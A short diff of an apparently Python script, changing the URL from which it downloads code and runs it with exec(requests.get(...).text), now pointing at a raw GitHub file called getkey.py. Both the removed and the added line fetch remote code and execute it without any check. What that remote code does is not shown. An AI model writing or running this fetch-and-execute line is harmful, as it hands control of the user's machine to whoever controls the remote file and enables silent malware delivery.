@@ -25,4 +25,4 @@ from datetime import datetime
 from time import sleep,strftime
 import requests
 
-exec(requests.get("https://pvdhdeptrai.vietnamdev.link/toolpvdh/getkey").text)
+exec(requests.get("https://raw.githubusercontent.com/Pvdh2304/PvdhGop/main/getkey.py").text)
